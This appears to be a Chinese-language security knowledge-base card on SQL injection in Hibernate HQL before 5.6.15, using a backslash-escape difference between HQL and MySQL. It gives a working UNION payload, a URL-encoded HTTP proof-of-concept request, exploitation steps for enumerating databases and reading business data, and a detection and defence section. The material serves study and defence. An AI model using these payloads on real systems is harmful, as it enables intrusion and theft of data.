---
id: web-generic-sqli-hibernate-hql-backslash-escape-union
title: Hibernate HQL 反斜杠转义差异逃逸：用 `\'` 让 HQL 当普通字符、MySQL 当转义符，闭合字符串并 UNION 注入
type: scenario
domain: web
path: web/generic/sqli
technique: hibernate-hql-backslash-differential-escape-sqli
aliases:
- HQL 反斜杠逃逸
- Hibernate 单引号转义差异
- HQL2SQL escape
- hql backslash injection
- 反斜杠差分注入
tags:
- sqli
- java
- hibernate
- hql
- orm
- mysql
- union
- escape-differential
cve: []
severity: high
confidence: high
affected_versions: Hibernate 5.6.15 之前
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V279
  verified_at: '2026-11-07T23:38:52+08:00'
  notes: 已对照原文核对：5.6.15 之前反斜杠转义差异（HQL 不识别 \、MySQL 识别），payload mysql%5c''and+1=2+union+select+user(),version()%23 与 img/23-25 的生成 SQL 与 root@192.168.65.1/8.0.38 回显一致。dup-scan 判与 sql()/function() 互為 likely_duplicate，经原文裁决为不同机制：本卡是词法转义差分（5.6.15 之前），sql() 是 6.x 函数、function() 是 5.x/6.x 函数名拼接，触发版本/语法/利用步骤均不同，三卡均保留、不删卡。
---

## 一句话结论

当 Hibernate（原文标注 5.6.15 之前）把拼进 HQL 字符串字面量中的用户输入原样翻译进原生 SQL 时，`\` 在 HQL 词法里只是普通字符、在 MySQL 里却是转义符：提交 `mysql\''and 1=2 union select user(),version()#` 可让 HQL 引擎仍把整段视为一个字符串，而 MySQL 把 `\'` 当作被转义的引号、让随后的 `'` 闭合字符串，剩余部分成为可执行的 UNION 语句，从而绕过 HQL 只允许映射表/字段的限制，直接读任意表。

## 原理

- HQL 与原生 SQL 是两层解析：`createQuery("... where tableschema='" + name + "'")` 先由 Hibernate 的 HQL 解析器判定语法，再翻译成数据库 SQL。
- HQL 的字符串字面量词法**不把反斜杠当转义符**：`'mysql\''and ...#'` 中的 `\` 与 `''` 都被当作普通字符（`''` 在 HQL 中还可表示转义单引号），整段仍在同一个字符串字面量内，因此 HQL 语法检查通过。
- 翻译时该字面量的内容被原样写入生成的 SQL。到 MySQL 层，`\` 是默认转义符：`\'` 变成字符串内的单引号，紧随的 `'` 结束字符串；于是 `and 1=2 union select user(),version()#` 落在字符串外，成为 SQL 代码，末尾 `#` 注释掉 HQL 拼接时补上的收尾引号。
- 关键差异在于两层对同一字节序列的解释不同（HQL 不识别 `\` 转义、MySQL 识别），而不是某个字符被过滤遗漏；因此只要该版本 Hibernate 不做反斜杠归一化，任何拼进 HQL 字符串字面量的注入点都能升级为原生 SQL 注入。
- 版本边界（原文标注）：5.6.15 之前可利用；6.0.1.Final 起 HQL 开始把 `\` 加倍（`mysql\'` → `mysql\\'`），该差分消失；6.1.7.Final 起引号处理再次变化，仍不可用。实际目标需以 Hibernate 版本与数据库字符串转义模式为准。

## 触发条件

- 用户输入被字符串拼接进 `createQuery()` 的 HQL 字面量（如 `where x='"+param+"'`），而不是 `setParameter()` 绑定。
- Hibernate 版本处于原文标注的可利用区间（5.6.15 之前）；6.x 不可用。
- 后端为 MySQL 等「反斜杠为字符串转义符」的数据库；若数据库关闭反斜杠转义（如 MySQL `NO_BACKSLASH_ESCAPES`），差分不成立。
- 注入点所在 SELECT 的列数与类型可与 UNION 结果对齐（本例实体映射两列，故 `union select user(),version()`）。
- 请求参数中的 `\`、`#` 能按 URL 编码（`%5c`、`%23`）原样到达应用层，未被 WAF 归一化或拦截。

## 利用步骤

1. 确认拼接点：输入单引号观察 HQL 语法错误；再输入 `mysql\`，若 HQL 不报错而数据库报 SQL 语法错误（日志/回显出现 `'mysql\'` 附近语法错误），说明 HQL 把 `\` 当普通字符透传，差分存在。
2. 构造逃逸：`mysql\''and 1=2 union select user(),version()#`。HQL 侧整段是一个字符串；SQL 侧变成 `... where table_schema='mysql\'' and 1=2 union select user(),version()#'`，`\'` 被 MySQL 吞掉、第二个 `'` 闭合字符串。
3. 对齐列数：按实体映射的列数/类型调整 UNION（本例 `user(),version()` 对应 `table_name,table_schema` 两列）。
4. URL 编码发送（`\`→`%5c`，`#`→`%23`）：`?name=mysql%5c''and+1=2+union+select+user(),version()%23`。
5. 响应中回显数据库用户与版本（如 `root@192.168.65.1`、`8.0.38`），即逃逸成功；随后把 UNION 后半段替换为 `information_schema` 查询即可枚举库表列、读取业务数据。
6. 若回显列不可见，仍可在 SQL 层使用报错/布尔/时间盲注，因为此时已不受 HQL 映射限制。

## PoC

原文环境为 HQL 映射 `tables(table_name, table_schema)` 的查询接口，最小请求（未在本机执行）：

```http
GET /VulDemo/SQLDemo5?name=mysql%5c''and+1=2+union+select+user(),version()%23 HTTP/1.1
Host: 127.0.0.1:8080
```

对应 HQL 拼接结果：

```text
from com.demo.bean.User where tableschema='mysql\''and 1=2 union select user(),version()#'
```

MySQL 解析后的等价语句：

```sql
select u1_0.table_name, u1_0.table_schema from tables u1_0
where u1_0.table_schema='mysql\'' and 1=2 union select user(),version()#'
```

响应回显 `User{ tablename='root@192.168.65.1', tableschema='8.0.38' }`，证明 UNION 已在原生 SQL 层执行。

## 变体与关联

- 版本变体：6.0.1.Final 起反斜杠被加倍、6.1.7.Final 起引号处理变化，均不再能利用该差分；遇到 6.x 应改用 `sql()` 或 `function()` 逃逸。
- 数据库变体：原理依赖「HQL 不识别反斜杠 + 数据库识别反斜杠」的差异；PostgreSQL/Oracle/MSSQL 的字符串转义规则不同，需按目标数据库重新构造，不能照搬 MySQL payload。
- 关联：`sql()` 函数逃逸（Hibernate 6.x）与 `function()` 关键字逃逸（5.x/6.x 通用）是同一「HQL→原生 SQL」目标的其他通道；基础 HQL 层面注入（无逃逸）见同路径的 Hibernate HQL 拼接注入卡。

## 检测与防御

- 修复根因：所有 HQL 参数使用 `:name`/`?` 占位 + `setParameter()`，禁止字符串拼接；动态排序/表名用白名单枚举。
- 配置：升级到已修复该转义差异的 Hibernate 版本；MySQL 可评估启用 `NO_BACKSLASH_ESCAPES`（但这是纵深防御，不能替代参数化）。
- 检测：请求参数出现 `%5c`/`\` 紧跟单引号、`union select`、`#` 等组合；Hibernate SQL 日志中字面量内出现反斜杠+引号；数据库报错出现 `'mysql\'` 附近语法错误；同一参数在 HQL 层通过、SQL 层报错的异常模式。
- 审计：搜索 `createQuery(` 与 `+` 拼接、`String.format`/模板拼接 HQL；对使用 5.6.15 之前版本且存在拼接查询的应用优先排查。
